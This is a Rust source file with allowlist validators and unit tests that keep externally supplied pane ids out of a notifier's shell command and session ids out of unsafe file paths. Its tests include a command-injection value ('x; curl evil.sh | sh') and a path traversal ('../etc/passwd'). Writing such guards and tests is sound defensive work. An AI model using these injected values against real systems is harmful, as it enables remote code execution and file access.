//! Guards on the two values that arrive from outside and are then used as
//! something more dangerous than text.

/// True when a pane id may be interpolated into a notifier's execute-on-click
/// argument, which takes a SHELL STRING. A pane carrying `; curl ... | sh`
/// would otherwise run when the operator clicks the banner, and the value comes
/// from the terminal multiplexer, which this engine does not own.
///
/// An ALLOWLIST, so a character is refused until it is shown to be inert in a
/// shell word. The colon earns its place by being herdr's own separator
/// (`wW:p21`) and by being no operator at all: it is the null command in
/// command position, never inside an argument. Without it this predicate
/// refuses every real pane id, and the banner silently loses the
/// click-to-focus that the pane id exists to carry.
pub fn pane_is_safe(pane: &str) -> bool {
    !pane.is_empty()
        && pane.chars().all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | ':' | '-')
        })
}

/// True when a harness-supplied session id may be used as a FILENAME. The id
/// arrives inside a hook payload and is interpolated into a path, so a value
/// carrying a separator or a parent reference would write outside its
/// directory. This allowlist is NARROWER than the pane one: nothing here is a
/// multiplexer id, so the colon has nothing to earn its place with.
pub fn session_id_is_safe(session_id: &str) -> bool {
    !session_id.is_empty()
        && !session_id.contains("..")
        && session_id.chars().all(|character| {
            character.is_ascii_alphanumeric() || matches!(character, '.' | '_' | '-')
        })
}

#[cfg(test)]
mod tests {
    use super::{pane_is_safe, session_id_is_safe};

    // --- pane_is_safe ------------------------------------------------------

    #[test]
    fn an_ordinary_pane_id_is_safe_to_interpolate() {
        assert!(pane_is_safe("pane-1.2_3"));
    }

    #[test]
    fn a_herdr_pane_id_is_safe_colon_and_all_or_no_banner_can_focus_a_pane() {
        // herdr's real ids look like wW:p21. An allowlist without the colon
        // drops the pane from EVERY banner on this host and loses
        // click-to-focus, the feature the pane id exists for. A colon is inert
        // in a shell word: the danger set is ; | & $ ` newline and quotes.
        assert!(pane_is_safe("wW:p21"));
    }

    #[test]
    fn a_pane_id_carrying_shell_metacharacters_is_refused() {
        assert!(!pane_is_safe("x; curl evil.sh | sh"));
    }

    #[test]
    fn a_pane_id_carrying_a_single_metacharacter_is_refused() {
        for unsafe_pane in [
            "a$b", "a`b", "a&b", "a|b", "a;b", "a'b", "a\"b", "a b", "a\nb", "a/b",
        ] {
            assert!(
                !pane_is_safe(unsafe_pane),
                "{unsafe_pane} must not be treated as safe"
            );
        }
    }

    #[test]
    fn an_empty_pane_id_is_refused_rather_than_treated_as_a_command() {
        assert!(!pane_is_safe(""));
    }

    // --- session_id_is_safe ------------------------------------------------

    #[test]
    fn an_ordinary_session_id_is_safe_as_a_filename() {
        assert!(session_id_is_safe("a1b2-c3d4_e5.f6"));
    }

    #[test]
    fn a_session_id_carrying_a_path_separator_is_refused() {
        assert!(!session_id_is_safe("a/b"));
    }

    #[test]
    fn a_session_id_carrying_a_parent_reference_is_refused_even_though_dots_are_allowed() {
        assert!(session_id_is_safe("a.b"));
        assert!(!session_id_is_safe("a..b"));
        assert!(!session_id_is_safe(".."));
        assert!(!session_id_is_safe("../etc/passwd"));
    }

    #[test]
    fn a_session_id_carrying_a_colon_is_refused_unlike_a_pane_id() {
        assert!(!session_id_is_safe("a:b"));
    }

    #[test]
    fn a_session_id_carrying_shell_metacharacters_or_spaces_is_refused() {
        for unsafe_id in ["a b", "a;b", "a$b", "a\nb", "a*b"] {
            assert!(
                !session_id_is_safe(unsafe_id),
                "{unsafe_id} must not be treated as safe"
            );
        }
    }

    #[test]
    fn an_empty_session_id_is_refused_rather_than_naming_a_directory() {
        assert!(!session_id_is_safe(""));
    }
}
